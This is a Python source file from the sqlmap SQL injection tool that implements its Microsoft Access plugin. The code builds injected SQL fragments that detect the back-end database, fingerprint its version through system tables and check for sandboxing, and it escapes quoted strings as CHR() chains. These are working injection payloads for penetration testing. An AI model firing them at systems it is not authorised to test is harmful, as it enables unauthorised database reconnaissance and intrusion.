#!/usr/bin/env python

"""
$Id: oracle.py 1003 2010-01-02 02:02:12Z inquisb $

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapSyntaxException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.session import setDbms
from lib.core.settings import ACCESS_ALIASES
from lib.core.settings import ACCESS_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class AccessMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines Access methods
    """

    def __init__(self):
        self.excludeDbsList = ACCESS_SYSTEM_DBS

        Enumeration.__init__(self, "Microsoft Access")
        Filesystem.__init__(self)
        Takeover.__init__(self)
        
        unescaper.setUnescape(AccessMap.unescape)

    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "CHR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "&"

                expression = expression.replace(old, unescaped)
        else:
            unescaped = "".join("CHR(%d)&" % ord(c) for c in expression)
            if unescaped[-1] == "&":
                unescaped = unescaped[:-1]

            expression = unescaped

        return expression

    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find(")")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.lstrip("CHR(").rstrip(")")
            oldUpper = oldUpper.split("&")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped).replace("'&'", "")

        return expression
        
    def __sandBoxCheck(self):
        # Reference: http://milw0rm.com/papers/198
        retVal = None
        table = None
        if kb.dbmsVersion and len(kb.dbmsVersion) > 0:
            if kb.dbmsVersion[0] in ("97", "2000"):
                table = "MSysAccessObjects"
            elif kb.dbmsVersion[0] in ("2002-2003", "2007"):
                table = "MSysAccessStorage"
            if table:
                query   = agent.prefixQuery(" AND EXISTS(SELECT CURDIR() FROM %s)" % table)
                query   = agent.postfixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)
                retVal = "not sandboxed" if result else "sandboxed"
        
        return retVal
        
    def __sysTablesCheck(self):
        infoMsg = "executing system table(s) existance fingerprint"
        logger.info(infoMsg)
        
        # Microsoft Access table reference updated on 01/2010
        sysTables = { 
                        "97":           ("MSysModules2", "MSysAccessObjects"),
                        "2000" :        ("!MSysModules2", "MSysAccessObjects"),
                        "2002-2003" :   ("MSysAccessStorage", "!MSysNavPaneObjectIDs"),
                        "2007" :        ("MSysAccessStorage", "MSysNavPaneObjectIDs")
                    }
        # MSysAccessXML is not a reliable system table because it doesn't always exist
        # ("Access through Access", p6, should be "normally doesn't exist" instead of "is normally empty")

        for version, tables in sysTables.items():
            exist = True
            for table in tables:
                negate = False
                if table[0] == '!':
                    negate = True
                    table = table[1:]
                randInt = randomInt()
                query   = agent.prefixQuery(" AND EXISTS(SELECT * FROM %s WHERE %d=%d)" % (table, randInt, randInt))
                query   = agent.postfixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)
                if negate:
                    result = not result
                exist &= result
                if not exist:
                    break
            if exist:
                return version

        return None
        
    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "Microsoft Access"
            return value

        actVer = formatDBMSfp() + " (%s)" % (self.__sandBoxCheck())
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if conf.dbms in ACCESS_ALIASES:
            setDbms("Microsoft Access")
            if not conf.extensiveFp:
                return True

        logMsg = "testing Microsoft Access"
        logger.info(logMsg)

        payload = agent.fullPayload(" AND VAL(CVAR(1))=1")
        result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming Microsoft Access"
            logger.info(logMsg)

            payload = agent.fullPayload(" AND IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not Microsoft Access"
                logger.warn(warnMsg)
                return False

            setDbms("Microsoft Access")
            
            if not conf.extensiveFp:
                return True
            
            kb.dbmsVersion = [self.__sysTablesCheck()]
            
            return True
        else:
            warnMsg = "the back-end DMBS is not Microsoft Access"
            logger.warn(warnMsg)

            return False

    def getPasswordHashes(self):
        warnMsg = "on Microsoft Access it is not possible to enumerate the user password hashes"
        logger.warn(warnMsg)

        return {}
    
    def readFile(self, rFile):
        errMsg = "on Microsoft Access it is not possible to read files"
        raise sqlmapUnsupportedFeatureException, errMsg

    def writeFile(self, wFile, dFile, fileType=None, confirm=True):
        errMsg = "on Microsoft Access it is not possible to write files"
        raise sqlmapUnsupportedFeatureException, errMsg
    
    def osCmd(self):
        errMsg = "on Microsoft Access it is not possible to execute commands"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osShell(self):
        errMsg = "on Microsoft Access it is not possible to execute commands"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osPwn(self):
        errMsg  = "on Microsoft Access it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise sqlmapUnsupportedFeatureException, errMsg

    def osSmb(self):
        errMsg  = "on Microsoft Access it is not possible to establish an "
        errMsg += "out-of-band connection"
        raise sqlmapUnsupportedFeatureException, errMsg
    
    def getBanner(self):
        errMsg = "on Microsoft Access it is not possible to get a banner"
        raise sqlmapUnsupportedFeatureException, errMsg